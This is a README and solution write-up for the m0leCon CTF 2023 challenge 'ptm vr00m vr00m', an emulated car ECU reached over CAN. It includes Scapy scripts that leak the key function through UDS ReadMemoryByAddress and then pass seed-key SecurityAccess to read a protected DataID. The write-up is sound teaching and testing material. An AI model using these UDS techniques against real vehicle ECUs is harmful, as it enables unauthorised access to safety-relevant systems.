# ptm vr00m vr00m

## m0leCon CTF 2023 challenge

[m0leCon CTF 2023](https://ctftime.org/event/2033) is an on-site jeopardy-style CTF organized by [pwnthem0le](https://pwnthem0le.polito.it/). The top 10 teams will be invited to the final event, which will take place in Fall 2023 at Politecnico di Torino.

### Description
Since everyone and their dog is entering the car manufacturing market, ptm has decided to jump on the train as well. We are planning a ton of innovative features to destroy the competition, but basics first! It would be really awkward if our car got hacked. Can you assert the security of our ECU? (And in particular read the `DataID 31337`, where our biggest secret lies)<br>
For this challenge you should have received an email with the instructions to connect to a vm via ssh. You can talk to the ECU using the `transmission id 0x7D0`<br>
The original flag has been substituted by `ptm{sample_flag}`

### Deploy
The challenge can be started by looking at the commands in `/src/chall/start_chall.sh`.

## Solution
The challenge emulates an ECU that communicates via CAN using the `ISOTP` and `UDS` protocols.<br>
The emulator handles 3 sessions (1, 2, and 3) and six services (`0x10, 0x11, 0x22, 0x23, 0x27, 0x3E`). All of the sessions and most of the services are needed to solve this challenge.<br>
The goal is to read the `DataID 31337` that can only be read in `session 2` after being authenticated.<br>
The authentication method follows a `seed and key` paradigm:
 1. The tester asks the ECU for a randomly generated seed
 2. The tester applies a function (known a priori by the tester and ECU) to the received seed and sends the computed key back to the ECU
 3. The ECU applies the same function on the generated seed and checks whether the computed seed and the given one are the same. In which case the tester is authenticated.

The function used by the ECU to compute the key can be leaked by doing a `read memory by address` in `session 3`. Here's a script to leak it using Scapy:

```python
from scapy.contrib.automotive.uds import UDS, UDS_RMBA, UDS_DSC
from scapy.contrib.isotp import ISOTPNativeSocket

def read_by_address(sock: ISOTPNativeSocket):
    pkt = UDS() / UDS_RMBA(memoryAddressLen=3, memorySizeLen=3, memoryAddress3=1361, memorySize3=319)
    response = sock.sr1(pkt, verbose=0)
    with open("leak", "wb") as f:
        f.write(response.dataRecord)

    

sock = ISOTPNativeSocket("vcan0", 2000, 1968, basecls=UDS, padding=True, fd=False)
sock.sr1(UDS()/UDS_DSC( diagnosticSessionType=3), verbose=0)
read_by_address(sock)
```

After reversing the function all that's left is going into `session 2`, authenticate (every time the session is changed the authorization gets revoked), and read the `DataID 31337`. Here's a script to do it:

```python
from scapy.contrib.automotive.uds import UDS, UDS_DSC, UDS_RDBI, UDS_SA
from scapy.contrib.isotp import ISOTPNativeSocket
from ctypes import *

# I was too lazy to reimplement the function in python, so I'm just using the server library
lib = CDLL("/home/pixel/CAN/Tests/lib.so")

sock = ISOTPNativeSocket("vcan0", 2000, 1968, basecls=UDS, padding=True, fd=False)

# Change to 3
sock.sr1(UDS()/UDS_DSC(diagnosticSessionType=3), verbose=0)

# Change to 2
sock.sr1(UDS()/UDS_DSC(diagnosticSessionType=2), verbose=0)

# Authenticate
pkt = sock.sr1(UDS()/UDS_SA(securityAccessType=9), verbose=0)
key = lib.seed_key(pkt.securitySeed)
if key < 0:
    key += 2**32
key = key.to_bytes(4, "big")

sock.sr1(UDS()/UDS_SA(securityAccessType=10, securityKey=key), verbose=0)

# Read data 
pkt = UDS() / UDS_RDBI(identifiers=0x7a69)
response = sock.sr1(pkt, verbose=0)
print(bytes(response)[3:].decode())
```